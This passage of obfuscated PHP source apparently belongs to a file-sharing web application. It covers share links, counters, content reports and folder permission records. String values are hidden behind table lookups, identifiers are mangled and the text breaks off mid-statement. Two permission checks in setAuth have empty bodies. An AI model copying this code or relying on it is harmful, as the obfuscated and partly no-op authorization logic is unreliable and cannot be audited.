$ÂŞƒÈœû = $ˆÔ×¼Œú[2131]; } if ($ä„âşûÒ[$ˆÔ×¼Œú[663]] == $ˆÔ×¼Œú[228] && $É«Œ“•[$ˆÔ×¼Œú[663]] == $ˆÔ×¼Œú[91]) { $ÂŞƒÈœû = $ˆÔ×¼Œú[2129]; } if ($ä„âşûÒ[$ˆÔ×¼Œú[663]] == $ˆÔ×¼Œú[91] && $É«Œ“•[$ˆÔ×¼Œú[663]] == $ˆÔ×¼Œú[228]) { $ÂŞƒÈœû = $ˆÔ×¼Œú[2132]; } Model($ˆÔ×¼Œú[633])->eventShare($·õæ Á’, $ÂŞƒÈœû); return; } private function _addShareData($ ¨¯£Ò©, $–ö¬Ú÷Œ = array(), $«ß©Âåı = false) { $×œÉûúŞ =& $_SERVER[¦»×‡Ãã]; $ß§© Ğ± = $«ß©Âåı == $×œÉûúŞ[191] ? 0 : USER_ID; $€ªû§ú› = array($×œÉûúŞ[491] => $ ¨¯£Ò©, $×œÉûúŞ[1763] => $ß§© Ğ±); if ($ ¨¯£Ò© == 0) { $€ªû§ú› = array($×œÉûúŞ[2133] => $–ö¬Ú÷Œ[$×œÉûúŞ[1257]], $×œÉûúŞ[1763] => $ß§© Ğ±); } if ($™ºÅ‡å™ = $this->where($€ªû§ú›)->find()) { return $™ºÅ‡å™[$×œÉûúŞ[665]]; } if ($ ¨¯£Ò© == 0) { $”Í¨ë¾Ñ = array($×œÉûúŞ[32] => get_path_this($–ö¬Ú÷Œ[$×œÉûúŞ[87]])); } else { $”Í¨ë¾Ñ = Model($×œÉûúŞ[897])->sourceInfo($ ¨¯£Ò©); if (!$”Í¨ë¾Ñ) { return !1; } } if (!$–ö¬Ú÷Œ[$×œÉûúŞ[1661]]) { $–ö¬Ú÷Œ[$×œÉûúŞ[1661]] = $”Í¨ë¾Ñ[$×œÉûúŞ[32]]; } $Ô×Ôı´ù = array($×œÉûúŞ[1763] => $ß§© Ğ±, $×œÉûúŞ[491] => $ ¨¯£Ò©, $×œÉûúŞ[1661] => $×œÉûúŞ[12], $×œÉûúŞ[562] => 0, $×œÉûúŞ[663] => 0, $×œÉûúŞ[1257] => $×œÉûúŞ[12], $×œÉûúŞ[383] => $×œÉûúŞ[12], $×œÉûúŞ[967] => $×œÉûúŞ[12], $×œÉûúŞ[2134] => 0, $×œÉûúŞ[2135] => 0, $×œÉûúŞ[834] => 0, $×œÉûúŞ[2136] => $×œÉûúŞ[12], $×œÉûúŞ[2117] => $×œÉûúŞ[12]); $†âöÄöÏ = explode($×œÉûúŞ[50], $×œÉûúŞ[2137]); foreach ($†âöÄöÏ as $ÑàÕ«³) { if (!isset($–ö¬Ú÷Œ[$ÑàÕ«³])) { continue; } $Ô×Ôı´ù[$ÑàÕ«³] = $–ö¬Ú÷Œ[$ÑàÕ«³]; } $ö®ìÉ¾ = $this->add($Ô×Ôı´ù); $î†×òâ‹ = array($×œÉûúŞ[2117] => short_id($ö®ìÉ¾)); $this->where(array($×œÉûúŞ[2138] => $ö®ìÉ¾))->save($î†×òâ‹); return $ö®ìÉ¾; } private function _shareAuthSet($îØÛ›´, $ü¤ˆœÓ¨) { $¤œÜ‹ =& $_SERVER[¦»×‡Ãã]; if (!is_array($ü¤ˆœÓ¨)) { return !1; } $ˆ†‹ õ¶ = Model($¤œÜ‹[2083]); $ˆ†‹ õ¶->where(array($¤œÜ‹[665] => $îØÛ›´))->delete(); $áÃÍ›Ó™ = array(); foreach ($ü¤ˆœÓ¨ as $™¸Éœ³) { $§ª—ˆŠö = SourceModel::TYPE_USER; if ($™¸Éœ³[$¤œÜ‹[190]] == SourceModel::TYPE_GROUP) { $§ª—ˆŠö = SourceModel::TYPE_GROUP; } $«ØŸäï = array($¤œÜ‹[665] => $îØÛ›´, $¤œÜ‹[190] => $§ª—ˆŠö, $¤œÜ‹[569] => intval($™¸Éœ³[$¤œÜ‹[569]]), $¤œÜ‹[2079] => 0, $¤œÜ‹[2139] => -1); if ($™¸Éœ³[$¤œÜ‹[2079]]) { $«ØŸäï[$¤œÜ‹[2079]] = $™¸Éœ³[$¤œÜ‹[2079]]; } else { if ($™¸Éœ³[$¤œÜ‹[2139]]) { $«ØŸäï[$¤œÜ‹[2139]] = $™¸Éœ³[$¤œÜ‹[2139]]; } } $áÃÍ›Ó™[] = $«ØŸäï; } return $ˆ†‹ õ¶->addAll($áÃÍ›Ó™, array(), !0); } public function numViewAdd($˜‰í…İ¦) { $Šş¸ë Ò =& $_SERVER[¦»×‡Ãã]; $‹ĞØŞş¸ = array($Šş¸ë Ò[2138] => $˜‰í…İ¦); $this->where($‹ĞØŞş¸)->setAdd($Šş¸ë Ò[2134]); } public function numDownloadAdd($…èÚ–áÄ) { $±÷¨Ñø =& $_SERVER[¦»×‡Ãã]; $á­±†³ = array($±÷¨Ñø[2138] => $…èÚ–áÄ); $this->where($á­±†³)->setAdd($±÷¨Ñø[2135]); } protected function shareEdit($‰º®Â»¬, $àİª×ı‚) { $èş£ÄÊí =& $_SERVER[¦»×‡Ãã]; $Ü›°ô†î = $this->getInfo($‰º®Â»¬); if (!$Ü›°ô†î) { return !1; } $this->_checkLinkShare($àİª×ı‚, $Ü›°ô†î); $½¨“¬ş = array(); $€”Ş˜ûï = explode($èş£ÄÊí[50], $èş£ÄÊí[2140]); foreach ($€”Ş˜ûï as $É•ÜÌ¤‹) { if (!array_key_exists($É•ÜÌ¤‹, $àİª×ı‚)) { continue; } $½¨“¬ş[$É•ÜÌ¤‹] = $àİª×ı‚[$É•ÜÌ¤‹]; } $this->shareEventAdd($Ü›°ô†î[$èş£ÄÊí[193]], $àİª×ı‚, $èş£ÄÊí[1940]); $this->where(array($èş£ÄÊí[2138] => $‰º®Â»¬))->save($½¨“¬ş); if (isset($àİª×ı‚[$èş£ÄÊí[2126]])) { $this->_shareAuthSet($‰º®Â»¬, $àİª×ı‚[$èş£ÄÊí[2126]]); } return !0; } private function _checkLinkShare($¨¾ÁÏ‹, $ãÙãàËı) { $Ô‹áùçÒ =& $_SERVER[¦»×‡Ãã]; if ($¨¾ÁÏ‹[$Ô‹áùçÒ[562]] != $Ô‹áùçÒ[91]) { return; } $èôäºù¤ = $ãÙãàËı[$Ô‹áùçÒ[90]][$Ô‹áùçÒ[193]]; if ($ãÙãàËı[$Ô‹áùçÒ[90]][$Ô‹áùçÒ[33]] != $Ô‹áùçÒ[230]) { $ëÎùŒÆ… = $this->_folderReport($èôäºù¤); if (!$ëÎùŒÆ…) { return; } show_json(LNG($Ô‹áùçÒ[2141]) . $Ô‹áùçÒ[2142] . $ëÎùŒÆ…, !1); } $·ìîÙ’Ó = Model($Ô‹áùçÒ[897])->fileInfoGet($ãÙãàËı[$Ô‹áùçÒ[90]][$Ô‹áùçÒ[193]]); if (!$·ìîÙ’Ó) { return; } $Ú¿èİ¼› = $this->shareFileMeta($·ìîÙ’Ó[$Ô‹áùçÒ[541]]); if (isset($Ú¿èİ¼›[$Ô‹áùçÒ[450]]) && $Ú¿èİ¼›[$Ô‹áùçÒ[450]] == $Ô‹áùçÒ[91]) { show_json(LNG($Ô‹áùçÒ[2143]), !1); } } private function _folderReport($¤¿óï°) { $‚å‰ÙÁ² =& $_SERVER[¦»×‡Ãã]; $¨‚Öùûô = array($‚å‰ÙÁ²[541] => array($‚å‰ÙÁ²[1090], 0), $‚å‰ÙÁ²[823] => 3); $Ô°¦ÔÙ´ = Model($‚å‰ÙÁ²[2144])->where($¨‚Öùûô)->field($‚å‰ÙÁ²[541])->select(); if (!$Ô°¦ÔÙ´) { return !1; } $Ô°¦ÔÙ´ = array_to_keyvalue($Ô°¦ÔÙ´, $‚å‰ÙÁ²[12], $‚å‰ÙÁ²[541]); $ñ™ìßÈè = $‚å‰ÙÁ²[50] . $¤¿óï° . $‚å‰ÙÁ²[50]; $¨‚Öùûô = array($‚å‰ÙÁ²[541] => array($‚å‰ÙÁ²[7], $Ô°¦ÔÙ´), $‚å‰ÙÁ²[584] => array($‚å‰ÙÁ²[459], "\x25{$ñ™ìßÈè}\x25"), $‚å‰ÙÁ²[505] => 0); $À«áæİ = Model($‚å‰ÙÁ²[897])->where($¨‚Öùûô)->field($‚å‰ÙÁ²[2145])->find(); if (!$À«áæİ) { return !1; } $É‰†¤› = substr($À«áæİ[$‚å‰ÙÁ²[584]], strpos($À«áæİ[$‚å‰ÙÁ²[584]], $ñ™ìßÈè)); $¨‚Öùûô = array($‚å‰ÙÁ²[193] => array($‚å‰ÙÁ²[7], trim($É‰†¤›, $‚å‰ÙÁ²[50]))); $‘š÷éê„ = Model($‚å‰ÙÁ²[897])->where($¨‚Öùûô)->field($‚å‰ÙÁ²[32])->select(); $•©­å‡ = array_to_keyvalue($‘š÷éê„, $‚å‰ÙÁ²[12], $‚å‰ÙÁ²[32]); $•©­å‡[] = $À«áæİ[$‚å‰ÙÁ²[32]]; return implode($‚å‰ÙÁ²[8], $•©­å‡); } protected function remove($ıäÓ¿í•) { $¦ÊûŞÙĞ =& $_SERVER[¦»×‡Ãã]; $Ä„îæ¦± = is_array($ıäÓ¿í•) ? $ıäÓ¿í• : array($ıäÓ¿í•); for ($œÑ¼Â£Ÿ = 0; $œÑ¼Â£Ÿ < count($Ä„îæ¦±); $œÑ¼Â£Ÿ++) { $¦±÷Ş¯Ÿ = $this->getInfo($Ä„îæ¦±[$œÑ¼Â£Ÿ]); if ($¦±÷Ş¯Ÿ[$¦ÊûŞÙĞ[663]] == $¦ÊûŞÙĞ[91]) { Model($¦ÊûŞÙĞ[633])->eventShare($¦±÷Ş¯Ÿ[$¦ÊûŞÙĞ[193]], $¦ÊûŞÙĞ[2132]); } if ($¦±÷Ş¯Ÿ[$¦ÊûŞÙĞ[562]] == $¦ÊûŞÙĞ[91]) { Model($¦ÊûŞÙĞ[633])->eventShare($¦±÷Ş¯Ÿ[$¦ÊûŞÙĞ[193]], $¦ÊûŞÙĞ[2131]); } } if (is_array($ıäÓ¿í•)) { $ıäÓ¿í• = array($¦ÊûŞÙĞ[7], $ıäÓ¿í•); } $ğƒïáæ = array($¦ÊûŞÙĞ[665] => $ıäÓ¿í•); $ôıÆ©æ = $this->where($ğƒïáæ)->delete(); if ($ôıÆ©æ) { Model($¦ÊûŞÙĞ[666])->where(array($¦ÊûŞÙĞ[665] => $ıäÓ¿í•))->delete(); } return $ôıÆ©æ; } protected function removeBySource($’‹´‘Ô…) { $‡âÆá =& $_SERVER[¦»×‡Ãã]; $õô‹×©÷ = array($‡âÆá[491] => array($‡âÆá[492], $’‹´‘Ô…)); $“ŠĞêâÔ = $this->field($‡âÆá[665])->where($õô‹×©÷)->select(); $“ŠĞêâÔ = array_to_keyvalue($“ŠĞêâÔ, $‡âÆá[12], $‡âÆá[665]); if (!$“ŠĞêâÔ) { return; } $õô‹×©÷ = array($‡âÆá[2138] => array($‡âÆá[492], $“ŠĞêâÔ)); $this->where($õô‹×©÷)->delete(); Model($‡âÆá[666])->where($õô‹×©÷)->delete(); } public function listAll($ ëƒ“å) { $ˆğºÊ…ì =& $_SERVER[¦»×‡Ãã]; $ÚßÙ‚Ïî = array(); if ($ ëƒ“å[$ˆğºÊ…ì[1772]]) { $ÚßÙ‚Ïî[$ˆğºÊ…ì[1772]] = $ ëƒ“å[$ˆğºÊ…ì[1772]]; } if ($ ëƒ“å[$ˆğºÊ…ì[833]]) { $õ¶û¯Ş® = $ ëƒ“å[$ˆğºÊ…ì[834]] ? $ ëƒ“å[$ˆğºÊ…ì[834]] : strtotime(date($ˆğºÊ…ì[2146])); $ÚßÙ‚Ïî[$ˆğºÊ…ì[231]] = array($ˆğºÊ…ì[409], array($ ëƒ“å[$ˆğºÊ…ì[833]], $õ¶û¯Ş®)); } if ($ ëƒ“å[$ˆğºÊ…ì[33]]) { $ÚßÙ‚Ïî[$ ëƒ“å[$ˆğºÊ…ì[33]]] = 1; } else { $ÚßÙ‚Ïî[] = array($ˆğºÊ…ì[562] => array($ˆğºÊ…ì[1090], 0), $ˆğºÊ…ì[663] => array($ˆğºÊ…ì[1090], 0), $ˆğºÊ…ì[2120] => $ˆğºÊ…ì[2073]); } if ($ ëƒ“å[$ˆğºÊ…ì[2069]]) { $ÚßÙ‚Ïî[] = array($ˆğºÊ…ì[2117] => $ ëƒ“å[$ˆğºÊ…ì[2069]], $ˆğºÊ…ì[1661] => array($ˆğºÊ…ì[459], "\45{$ ëƒ“å[$ˆğºÊ…ì[2069]]}\x25"), $ˆğºÊ…ì[2120] => $ˆğºÊ…ì[2073]); } $ß´âÀŒÈ = $this->_makeOrder()->where($ÚßÙ‚Ïî)->selectPage(20); if (empty($ß´âÀŒÈ[$ˆğºÊ…ì[445]])) { return array(); } $this->_listDataApply($ß´âÀŒÈ[$ˆğºÊ…ì[445]]); return $ß´âÀŒÈ; } public function listDataApply($ÓÂŞ•³) { $this->_listDataApply($ÓÂŞ•³); return $ÓÂŞ•³; } private function _listDataApply(&$ÏºİçªÜ) { $«ÎÒŞ²É =& $_SERVER[¦»×‡Ãã]; $é¯»Ø = array_to_keyvalue($ÏºİçªÜ, $«ÎÒŞ²É[12], $«ÎÒŞ²É[1772]); $—¨è¸ÇÙ = Model($«ÎÒŞ²É[598])->userListInfo(array_unique($é¯»Ø)); $ƒÂï‚¦ø = array_to_keyvalue($ÏºİçªÜ, $«ÎÒŞ²É[12], $«ÎÒŞ²É[193]); $ “á³âŸ = Model($«ÎÒŞ²É[897])->sourceListInfo($ƒÂï‚¦ø, !0); foreach ($ÏºİçªÜ as $îş€—Ş => &$ââó‡Äß) { $‡áÏ…ôÁ = $ââó‡Äß[$«ÎÒŞ²É[1772]]; $ââó‡Äß[$«ÎÒŞ²É[2147]] = $—¨è¸ÇÙ[$‡áÏ…ôÁ] ? $—¨è¸ÇÙ[$‡áÏ…ôÁ] : !1; $İ÷ïØò² = $ââó‡Äß[$«ÎÒŞ²É[193]]; $ââó‡Äß[$«ÎÒŞ²É[90]] = $ “á³âŸ[$İ÷ïØò²] ? $ “á³âŸ[$İ÷ïØò²] : !1; if ($ââó‡Äß[$«ÎÒŞ²É[90]][$«ÎÒŞ²É[505]] == $«ÎÒŞ²É[91]) { unset($ÏºİçªÜ[$îş€—Ş]); } if ($ââó‡Äß[$«ÎÒŞ²É[90]] != $«ÎÒŞ²É[228] && !$ââó‡Äß[$«ÎÒŞ²É[90]]) { unset($ÏºİçªÜ[$îş€—Ş]); } } unset($ââó‡Äß); $ÏºİçªÜ = array_values($ÏºİçªÜ); } private function _makeOrder($×éâöºŞ = '') { $Ë®ñª²Ò =& $_SERVER[¦»×‡Ãã]; $¬¢£ü«ü = array($Ë®ñª²Ò[231], $Ë®ñª²Ò[834], $Ë®ñª²Ò[2134], $Ë®ñª²Ò[2135]); $ÔŞÙöÇá = array($Ë®ñª²Ò[523] => $Ë®ñª²Ò[524], $Ë®ñª²Ò[525] => $Ë®ñª²Ò[526]); $—ĞíÆÊ = Input::get($Ë®ñª²Ò[530], $Ë®ñª²Ò[7], $Ë®ñª²Ò[497], $¬¢£ü«ü); $™ÖÛ–Úø = Input::get($Ë®ñª²Ò[531], $Ë®ñª²Ò[7], $Ë®ñª²Ò[2148], array($Ë®ñª²Ò[2066], $Ë®ñª²Ò[525])); $™ÖÛ–Úø = $ÔŞÙöÇá[$™ÖÛ–Úø]; $×éâöºŞ = $×éâöºŞ . "{$—ĞíÆÊ}\x20{$™ÖÛ–Úø}"; return $this->order($×éâöºŞ); } public function reportAdd($¤æøŠÇ©) { $–¨ıàí€ =& $_SERVER[¦»×‡Ãã]; $š¶ÊÁƒá = array($–¨ıàí€[665] => $¤æøŠÇ©[$–¨ıàí€[665]], $–¨ıàí€[1772] => USER_ID); if (Model($–¨ıàí€[2144])->where($š¶ÊÁƒá)->find()) { return !1; } $½·‹¦ú = array($–¨ıàí€[665] => $¤æøŠÇ©[$–¨ıàí€[665]], $–¨ıàí€[1661] => $¤æøŠÇ©[$–¨ıàí€[1661]], $–¨ıàí€[193] => $¤æøŠÇ©[$–¨ıàí€[193]], $–¨ıàí€[541] => $¤æøŠÇ©[$–¨ıàí€[541]], $–¨ıàí€[1772] => USER_ID, $–¨ıàí€[33] => $¤æøŠÇ©[$–¨ıàí€[33]], $–¨ıàí€[526] => $¤æøŠÇ©[$–¨ıàí€[526]]); return Model($–¨ıàí€[2144])->add($½·‹¦ú); } public function reportList($¹¹Ÿ§ †) { $ÓÂ×¢ú =& $_SERVER[¦»×‡Ãã]; $Ãê÷êÔ– = array(); if ($¹¹Ÿ§ †[$ÓÂ×¢ú[833]]) { $Äµˆ›æ€ = $¹¹Ÿ§ †[$ÓÂ×¢ú[834]] ? $¹¹Ÿ§ †[$ÓÂ×¢ú[834]] : strtotime(date($ÓÂ×¢ú[2146])); $Ãê÷êÔ–[$ÓÂ×¢ú[231]] = array($ÓÂ×¢ú[409], array($¹¹Ÿ§ †[$ÓÂ×¢ú[833]], $Äµˆ›æ€)); } if (isset($¹¹Ÿ§ †[$ÓÂ×¢ú[33]]) && in_array($¹¹Ÿ§ †[$ÓÂ×¢ú[33]], array($ÓÂ×¢ú[91], $ÓÂ×¢ú[510], $ÓÂ×¢ú[2149], $ÓÂ×¢ú[2150], $ÓÂ×¢ú[2151]))) { $Ãê÷êÔ–[$ÓÂ×¢ú[33]] = $¹¹Ÿ§ †[$ÓÂ×¢ú[33]]; } if (isset($¹¹Ÿ§ †[$ÓÂ×¢ú[823]]) && in_array($¹¹Ÿ§ †[$ÓÂ×¢ú[823]], array($ÓÂ×¢ú[228], $ÓÂ×¢ú[91], $ÓÂ×¢ú[510], $ÓÂ×¢ú[2149]))) { $Ãê÷êÔ–[$ÓÂ×¢ú[823]] = $¹¹Ÿ§ †[$ÓÂ×¢ú[823]]; } $Šä°çá = Input::get($ÓÂ×¢ú[531], $ÓÂ×¢ú[7], $ÓÂ×¢ú[2148], array($ÓÂ×¢ú[2066], $ÓÂ×¢ú[525])); $–ŞêÃ» = array($ÓÂ×¢ú[523] => $ÓÂ×¢ú[524], $ÓÂ×¢ú[525] => $ÓÂ×¢ú[526]); $â·šüÏ = $ÓÂ×¢ú[2152] . $–ŞêÃ»[$Šä°çá]; $áö‘ªÜ‰ = Model($ÓÂ×¢ú[2144])->where($Ãê÷êÔ–)->order($â·šüÏ)->selectPage(20); if (empty($áö‘ªÜ‰[$ÓÂ×¢ú[445]])) { return array(); } $ı¦ù¿ˆ… = array_to_keyvalue_group($áö‘ªÜ‰[$ÓÂ×¢ú[445]], $ÓÂ×¢ú[823], $ÓÂ×¢ú[665]); if (!empty($ı¦ù¿ˆ…[0])) { $¹¹Ÿ§ † = $ı¦ù¿ˆ…[0]; $Ãê÷êÔ– = array($ÓÂ×¢ú[665] => array($ÓÂ×¢ú[7], $¹¹Ÿ§ †)); $áƒêì¬ê = $this->where($Ãê÷êÔ–)->field($ÓÂ×¢ú[665])->select(); $áƒêì¬ê = array_to_keyvalue($áƒêì¬ê, $ÓÂ×¢ú[12], $ÓÂ×¢ú[665]); $Âüˆš­Ÿ = array_diff($¹¹Ÿ§ †, $áƒêì¬ê); if (!empty($Âüˆš­Ÿ)) { foreach ($áö‘ªÜ‰[$ÓÂ×¢ú[445]] as $´ÅÄñ‹ß => $Û½¹¡) { if (in_array($Û½¹¡[$ÓÂ×¢ú[665]], $Âüˆš­Ÿ)) { unset($áö‘ªÜ‰[$ÓÂ×¢ú[445]][$´ÅÄñ‹ß]); } } } } $this->_listDataApply($áö‘ªÜ‰[$ÓÂ×¢ú[445]]); return $áö‘ªÜ‰; } public function reportStatus($ÈµØ½ä) { $»«ŞøÒß =& $_SERVER[¦»×‡Ãã]; $½ºÅòõĞ = array($»«ŞøÒß[475] => $ÈµØ½ä[$»«ŞøÒß[475]]); $ÉâËŠ„ = Model($»«ŞøÒß[2144])->where($½ºÅòõĞ)->field($»«ŞøÒß[2153])->find(); if (!$ÉâËŠ„) { return !1; } $“şç±ä = array($»«ŞøÒß[823] => $ÈµØ½ä[$»«ŞøÒß[823]]); if ($ÈµØ½ä[$»«ŞøÒß[823]] == $»«ŞøÒß[2149] && $ÉâËŠ„[$»«ŞøÒß[823]] == $»«ŞøÒß[2149]) { $“şç±ä[$»«ŞøÒß[823]] = 0; } $²Ğéí–Ó = Model($»«ŞøÒß[2144])->where($½ºÅòõĞ)->save($“şç±ä); if ($ÈµØ½ä[$»«ŞøÒß[823]] == $»«ŞøÒß[510]) { if ($ÉâËŠ„[$»«ŞøÒß[541]] != $»«ŞøÒß[228] && $this->shareFileMeta($ÉâËŠ„[$»«ŞøÒß[541]])) { $this->shareFileMeta($ÉâËŠ„[$»«ŞøÒß[541]], 0); } $this->remove($ÉâËŠ„[$»«ŞøÒß[665]]); return !0; } if ($²Ğéí–Ó && $ÈµØ½ä[$»«ŞøÒß[823]] == $»«ŞøÒß[2149]) { $¯àåáÛ = $“şç±ä[$»«ŞøÒß[823]] == $»«ŞøÒß[2149] ? 1 : 0; $this->shareFileMeta($ÉâËŠ„[$»«ŞøÒß[541]], $¯àåáÛ); $this->removeByFile($ÉâËŠ„[$»«ŞøÒß[541]]); } return $²Ğéí–Ó; } private function removeByFile($§Ïæø) { $ ¥ÇËíç =& $_SERVER[¦»×‡Ãã]; $«Œæ¸Î£ = Model($ ¥ÇËíç[897])->where(array($ ¥ÇËíç[541] => $§Ïæø))->field($ ¥ÇËíç[193])->select(); $òô¼½¥ó = array_to_keyvalue($«Œæ¸Î£, $ ¥ÇËíç[12], $ ¥ÇËíç[193]); $ôñÉûš = array($ ¥ÇËíç[193] => array($ ¥ÇËíç[7], $òô¼½¥ó), $ ¥ÇËíç[562] => 1); $«Œæ¸Î£ = $this->where($ôñÉûš)->field($ ¥ÇËíç[665])->select(); if (empty($«Œæ¸Î£)) { return; } $‚‰âè·Í = array_to_keyvalue($«Œæ¸Î£, $ ¥ÇËíç[12], $ ¥ÇËíç[665]); $this->remove($‚‰âè·Í); } private function shareFileMeta($¡Çı‚„”, $¾Ñşøâ = null) { $öÎ“®ğ£ =& $_SERVER[¦»×‡Ãã]; $åƒ¦ñœ­ = array($öÎ“®ğ£[541] => $¡Çı‚„”, $öÎ“®ğ£[97] => $öÎ“®ğ£[2154]); if (is_null($¾Ñşøâ)) { return Model($öÎ“®ğ£[2155])->where($åƒ¦ñœ­)->find(); } $åƒ¦ñœ­[$öÎ“®ğ£[450]] = $¾Ñşøâ; Model($öÎ“®ğ£[2155])->add($åƒ¦ñœ­, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\x65\137\141\165\x74\x68"; public function getAuth($íŠÌé¹) { $ÇãïÊ‡ =& $_SERVER[¦»×‡Ãã]; $à€ô¢˜À = $this->sourceAuthSelect($íŠÌé¹); $ƒ€€Ó´˜ = array(); $ı»¾í¬˜ = array(); $¿¢ü€“ = 2 << 25; foreach ($à€ô¢˜À as $›àÊûáù) { $ğçıŠæ = Model($ÇãïÊ‡[571])->listData($›àÊûáù[$ÇãïÊ‡[2079]]); if (!$ğçıŠæ) { continue; } $ƒ€€Ó´˜[] = $›àÊûáù; $ªÌ‰·ÇÑ = 0; if ($›àÊûáù[$ÇãïÊ‡[190]] == SourceModel::TYPE_GROUP) { $ªÌ‰·ÇÑ = $¿¢ü€“ * 2; } if ($›àÊûáù[$ÇãïÊ‡[190]] == SourceModel::TYPE_USER) { $ªÌ‰·ÇÑ = $¿¢ü€“; } if ($›àÊûáù[$ÇãïÊ‡[190]] == SourceModel::TYPE_USER && $›àÊûáù[$ÇãïÊ‡[569]] == $ÇãïÊ‡[228]) { $ªÌ‰·ÇÑ = 0; } $ı»¾í¬˜[] = $ğçıŠæ[$ÇãïÊ‡[487]] + $ªÌ‰·ÇÑ; } array_multisort($ı»¾í¬˜, SORT_DESC, $ƒ€€Ó´˜); return $ƒ€€Ó´˜; } public function sourceAuthSelect($éÆÊÒ­Õ) { $•ƒÚñƒ÷ =& $_SERVER[¦»×‡Ãã]; static $å°Æéî— = array(); $À¢áŠçÂ = is_array($éÆÊÒ­Õ) ? !1 : !0; if ($À¢áŠçÂ) { $éÆÊÒ­Õ = array($éÆÊÒ­Õ); } $î´½ì»ú = array(); foreach ($éÆÊÒ­Õ as $¬¸ÜÚí) { if (isset($å°Æéî—[$¬¸ÜÚí])) { $î´½ì»ú[$¬¸ÜÚí] = $å°Æéî—[$¬¸ÜÚí]; } } if (count($î´½ì»ú) == count($éÆÊÒ­Õ)) { return $À¢áŠçÂ ? $î´½ì»ú[$éÆÊÒ­Õ[0]] : $î´½ì»ú; } $ÃŠá¼ò = $•ƒÚñƒ÷[2156]; $¼ï®Ìâ¶ = array($•ƒÚñƒ÷[193] => array($•ƒÚñƒ÷[7], $éÆÊÒ­Õ)); $öªüëş = $this->field($ÃŠá¼ò)->order($•ƒÚñƒ÷[475])->where($¼ï®Ìâ¶)->select(); $×Èñıèñ = array_to_keyvalue_group($öªüëş, $•ƒÚñƒ÷[193]); foreach ($éÆÊÒ­Õ as $¬¸ÜÚí) { $å°Æéî—[$¬¸ÜÚí] = $×Èñıèñ[$¬¸ÜÚí] ? $×Èñıèñ[$¬¸ÜÚí] : array(); } if ($À¢áŠçÂ) { return $öªüëş; } return $×Èñıèñ; } public function setAuth($„ƒùâ„Í, $‡¬Ï¾ò©) { $‹“ùïô÷ =& $_SERVER[¦»×‡Ãã]; $ÁªÅÙˆ­ = Model($‹“ùïô÷[1420])->sourceInfo($„ƒùâ„Í); if (!$ÁªÅÙˆ­) { return !1; } if ($ÁªÅÙˆ­[$‹“ùïô÷[190]] != SourceModel::TYPE_GROUP) { return !1; } $ŞÙú•ÛŞ = 1; $¹Üê·Ú­ = $ÁªÅÙˆ­[$‹“ùïô÷[569]]; if ($¹Üê·Ú­ != $ŞÙú•ÛŞ) { $¼´ÑéÅ = array($‹“ùïô÷[1971] => $¹Üê·Ú­); $ÎóğÊëî = Model($‹“ùïô÷[2065])->field($‹“ùïô÷[1772])->where($¼´ÑéÅ)->select(); $ÎóğÊëî = array_to_keyvalue($ÎóğÊëî, $‹“ùïô÷[12], $‹“ùïô÷[1772]); } $ÍÈÓÊÑ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $À¤ğ¶¯Ê = array(); foreach ($‡¬Ï¾ò© as $úˆ¦®«Ì) { if (!in_array($úˆ¦®«Ì[$‹“ùïô÷[190]], $ÍÈÓÊÑ)) { show_json(LNG($‹“ùïô÷[2157]), !1); } if ($¹Üê·Ú­ != $ŞÙú•ÛŞ) { if ($úˆ¦®«Ì[$‹“ùïô÷[190]] == SourceModel::TYPE_GROUP) { } if ($úˆ¦®«Ì[$‹“ùïô÷[569]] != 0 && !in_array($úˆ¦®«Ì[$‹“ùïô÷[569]], $ÎóğÊëî)) { } } if ($úˆ¦®«Ì[$‹“ùïô÷[569]] == 0) { $úˆ¦®«Ì[$‹“ùïô÷[190]] = SourceModel::TYPE_USER; } $À¤ğ¶¯Ê[] = array($‹“ùïô÷[193] => $„ƒùâ„Í, $‹“ùïô÷[190] => intval($úˆ¦®«Ì[$‹“ùïô÷[190]]), $‹“ùïô÷[569] => intval($úˆ¦®«Ì[$‹“ùïô÷[569]]), $‹“ùïô÷[2079] => intval($úˆ¦®«Ì[$‹“ùïô÷[2079]]) ? intval($úˆ¦®«Ì[$‹“ùïô÷[2079]]) : 0, $‹“ùïô÷[2139] => intval($úˆ¦®«Ì[$‹“ùïô÷[2139]]) ? intval($úˆ¦®«Ì[$‹“ùïô÷[2139]]) : -1); } $this->where(array($‹“ùïô÷[491] => $„ƒùâ„Í))->delete(); $this->addAll($À¤ğ¶¯Ê); return !0; } public function authClear($æËãâ‰ˆ) { $µùêóÕ =& $_SERVER[¦»×‡Ãã]; $ÒÁÛôõÉ = Model($µùêóÕ[1420])->sourceInfo($æËãâ‰ˆ); $À¦ç³³ = array($æËãâ‰ˆ); if ($ÒÁÛôõÉ[$µùêóÕ[485]] == $µùêóÕ[91]) { $Ú†Âó = array($µùêóÕ[652] => array($µùêóÕ[612], $ÒÁÛôõÉ[$µùêóÕ[584]] . $æËãâ‰ˆ . $µùêóÕ[613])); $À¦ç³³ = Model($µùêóÕ[1420])->field($µùêóÕ[491])->where($Ú†Âó)->getField($µùêóÕ[193], !0); $À¦ç³³[] = $æËãâ‰ˆ; } $this->where(array($µùêóÕ[491] => array($µùêóÕ[492], $À¦ç³³)))->delete(); return !0; } public function getAllChildren($É‡‹ô‘) { $‘é¤»‰ =& $_SERVER[¦»×‡Ãã]; $•Á¼Õ = Model($‘é¤»‰[1420])->sourceInfo($É‡‹ô‘); if ($•Á¼Õ[$‘é¤»‰[485]] != $‘é¤»‰[91]) { return $this->sourceListAuth(array($É‡‹ô‘)); } if ($•Á¼Õ[$‘é¤»‰[190]] != SourceModel::TYPE_GROUP) { return array(); } $¨…íãå¶ = 1; $Íã±Ø¿‡ = array($É‡‹ô‘); if ($•Á¼Õ[$‘é¤»‰[192]] == $‘é¤»‰[228] && $•Á¼Õ[$‘é¤»‰[569]] != $¨…íãå¶) { $Íã±Ø¿‡ = $this->groupChidldAllRootSource($•Á¼Õ[$‘é¤»‰[569]]); } $¬Üğ¯× = $this->field($‘é¤»‰[193])->group($‘é¤»‰[193])->select(); $¬Üğ¯× = array_to_keyvalue($¬Üğ¯×, $‘é¤»‰[12], $‘é¤»‰[193]); if (!$¬Üğ¯×) { return array(); } $Å³¤¦Ã = $‘é¤»‰[2158]; $Í™Œ½“ß = array($‘é¤»‰[193] => array($‘é¤»‰[7], $¬Üğ¯×), $‘é¤»‰[505] => $‘é¤»‰[228]); $ ÷ñæÉá = Model($‘é¤»‰[897])->field($Å³¤¦Ã)->where($Í™Œ½“ß)->select(); $±ôòËÊ÷ = 